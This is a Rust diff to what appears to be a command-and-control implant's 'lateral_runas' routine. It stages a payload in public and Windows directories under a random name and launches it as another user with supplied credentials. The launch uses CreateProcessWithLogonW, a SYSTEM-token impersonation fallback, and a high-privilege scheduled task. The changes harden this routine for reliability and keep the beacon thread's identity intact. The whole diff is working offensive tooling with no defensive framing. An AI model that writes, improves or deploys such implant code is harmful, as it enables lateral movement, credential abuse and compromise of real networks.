@@ -30,6 +30,9 @@ mod inner {
 
     #[link(name = "advapi32")]
     extern "system" {
+        fn OpenThreadToken(thread: isize, desired_access: u32, open_as_self: i32,
+                           token: *mut isize) -> i32;
+        fn SetThreadToken(thread: *const isize, token: isize) -> i32;
         fn CreateProcessWithLogonW(
             username: *const u16, domain: *const u16, password: *const u16,
             logon_flags: u32, application: *const u16, command: *mut u16,
@@ -55,7 +58,35 @@ mod inner {
 
     #[link(name = "kernel32")]
     extern "system" {
+        fn GetCurrentThread() -> isize;
         fn GetLocalTime(system_time: *mut NativeSystemTime);
+        fn GetExitCodeProcess(process: isize, exit_code: *mut u32) -> i32;
+        fn WaitForSingleObject(handle: isize, milliseconds: u32) -> u32;
+    }
+
+    const TOKEN_IMPERSONATE_ACCESS: u32 = 0x0004;
+    const WAIT_OBJECT_0: u32 = 0;
+
+    unsafe fn restore_thread_identity(
+        impersonated: bool,
+        had_previous_token: bool,
+        previous_token: isize,
+    ) -> u32 {
+        if !impersonated {
+            return 0;
+        }
+        if had_previous_token {
+            if SetThreadToken(std::ptr::null(), previous_token) != 0 {
+                return 0;
+            }
+            let err = GetLastError();
+            RevertToSelf();
+            err
+        } else if RevertToSelf() != 0 {
+            0
+        } else {
+            GetLastError()
+        }
     }
 
     fn to_wide(s: &str) -> Vec<u16> {
@@ -289,6 +320,17 @@ mod inner {
         let logon_err = if logon_ok == 0 { GetLastError() } else { 0 };
         if logon_ok != 0 {
             let pid = pi.dwProcessId;
+            let wait = WaitForSingleObject(pi.hProcess, 1000);
+            if wait == WAIT_OBJECT_0 {
+                let mut exit_code = 0u32;
+                GetExitCodeProcess(pi.hProcess, &mut exit_code);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                return Err(format!(
+                    "runas child exited immediately (method=CreateProcessWithLogonW, exit=0x{:08x})",
+                    exit_code
+                ));
+            }
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             return Ok((pid, "CreateProcessWithLogonW".to_string()));
@@ -297,6 +339,13 @@ mod inner {
         // Ensure the fallback is executed with the same SYSTEM context that
         // backs the post-getsystem shell when one is available.
         let system_token = crate::commands::system_token_handle();
+        let mut previous_token = 0isize;
+        let had_previous_token = OpenThreadToken(
+            GetCurrentThread(),
+            TOKEN_IMPERSONATE_ACCESS | TOKEN_QUERY,
+            0,
+            &mut previous_token,
+        ) != 0;
         let mut impersonated = false;
         if system_token != 0 && ImpersonateLoggedOnUser(system_token) != 0 {
             impersonated = true;
@@ -362,15 +411,52 @@ mod inner {
 
         if created != 0 {
             let pid = pi.dwProcessId;
+            let wait = WaitForSingleObject(pi.hProcess, 1000);
+            if wait == WAIT_OBJECT_0 {
+                let mut exit_code = 0u32;
+                GetExitCodeProcess(pi.hProcess, &mut exit_code);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                CloseHandle(user_token);
+                let restore_err = restore_thread_identity(
+                    impersonated, had_previous_token, previous_token,
+                );
+                if had_previous_token { CloseHandle(previous_token); }
+                if restore_err != 0 {
+                    return Err(format!(
+                        "runas child exited immediately (method={}, exit=0x{:08x}); thread token restore failed={}",
+                        method, exit_code, restore_err
+                    ));
+                }
+                return Err(format!(
+                    "runas child exited immediately (method={}, exit=0x{:08x})",
+                    method, exit_code
+                ));
+            }
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             CloseHandle(user_token);
-            if impersonated { RevertToSelf(); }
+            let restore_err = restore_thread_identity(
+                impersonated, had_previous_token, previous_token,
+            );
+            if had_previous_token { CloseHandle(previous_token); }
+            if restore_err != 0 {
+                method.push_str(&format!(" (thread token restore failed={})", restore_err));
+            }
             return Ok((pid, method));
         }
 
         if user_token != 0 { CloseHandle(user_token); }
-        if impersonated { RevertToSelf(); }
+        let restore_err = restore_thread_identity(
+            impersonated, had_previous_token, previous_token,
+        );
+        if had_previous_token { CloseHandle(previous_token); }
+        if restore_err != 0 {
+            return Err(format!(
+                "CreateProcessWithLogonW={} batch={} interactive={} AsUser={} WithToken={}; thread token restore failed={}",
+                logon_err, batch_err, interactive_err, as_user_err, with_token_err, restore_err,
+            ));
+        }
         Err(format!(
             "CreateProcessWithLogonW={} batch={} interactive={} AsUser={} WithToken={}",
             logon_err, batch_err, interactive_err, as_user_err, with_token_err,
@@ -476,27 +562,53 @@ mod inner {
     pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
         let svc_name = rand_svc_name();
 
-        // Write payload bytes to disk when provided.
-        let drop_path: String;
-        let effective_path: &str = {
-            let fname = std::path::Path::new(cmd_path)
-                .file_name()
-                .map(|f| f.to_string_lossy().into_owned())
-                .unwrap_or_else(|| format!("{}.exe", svc_name));
-            drop_path = format!("C:\\Users\\Public\\{}", fname);
-            if !data.is_empty() {
-                fs::write(&drop_path, data)
-                    .map_err(|e| format!("write payload failed: {}", e))?;
-            } else if drop_path.to_lowercase() != cmd_path.to_lowercase() {
-                fs::copy(cmd_path, &drop_path)
-                    .map_err(|e| format!("copy payload failed: {}", e))?;
+        // Stage under a unique name so a self-spawn never overwrites the
+        // executable that is currently running.
+        let exe_name = format!("{}.exe", svc_name);
+        let mut effective_path = String::new();
+        let mut stage_errors: Vec<String> = Vec::new();
+        for directory in [r"C:\Users\Public", r"C:\Windows\Temp", r"C:\Windows"] {
+            let candidate = format!(r"{}\{}", directory, exe_name);
+            let staged = if !data.is_empty() {
+                fs::write(&candidate, data).map(|_| ())
+            } else {
+                fs::copy(cmd_path, &candidate).map(|_| ())
+            };
+            match staged {
+                Ok(()) if std::path::Path::new(&candidate).exists() => {
+                    effective_path = candidate;
+                    break;
+                }
+                Ok(()) => stage_errors.push(format!("{}: file not found after staging", directory)),
+                Err(err) => stage_errors.push(format!("{}: {}", directory, err)),
             }
-            if std::path::Path::new(&drop_path).exists() { &drop_path } else {
-                return Err("runas: staged payload is not readable".to_string());
-            }
-        };
+        }
+        if effective_path.is_empty() {
+            return Err(format!(
+                "runas: staged payload is not readable ({})",
+                stage_errors.join("; ")
+            ));
+        }
 
-        let direct_err = match unsafe { spawn_as_user_direct(effective_path, user, pass) } {
+        // Token impersonation is thread-local on Windows. Keep the beacon
+        // thread out of the credential launch so a failed fallback cannot
+        // alter the identity used by the next beacon or result submission.
+        let launch_path = effective_path.clone();
+        let launch_user = user.to_string();
+        let launch_pass = pass.to_string();
+        let direct_result = match std::thread::Builder::new()
+            .name("runas-launch".to_string())
+            .spawn(move || unsafe {
+                spawn_as_user_direct(&launch_path, &launch_user, &launch_pass)
+            })
+        {
+            Ok(thread) => thread
+                .join()
+                .map_err(|_| "runas: launch thread terminated unexpectedly".to_string())
+                .and_then(|result| result),
+            Err(err) => Err(format!("runas: launch thread creation failed: {}", err)),
+        };
+        let direct_err = match direct_result {
             Ok((pid, method)) => {
                 return Ok(format!(
                     "[+] runas → {}\n    path: {}\n    pid: {}\n    method: {}",
@@ -524,7 +636,7 @@ mod inner {
             .args([
                 "/create",
                 "/RU", &ru_account, "/RP", pass,
-                "/TR", effective_path,
+                "/TR", effective_path.as_str(),
                 "/TN", &task_name,
                 "/SC", "ONCE", "/ST", &start_at, "/RL", "HIGHEST",
                 "/F",
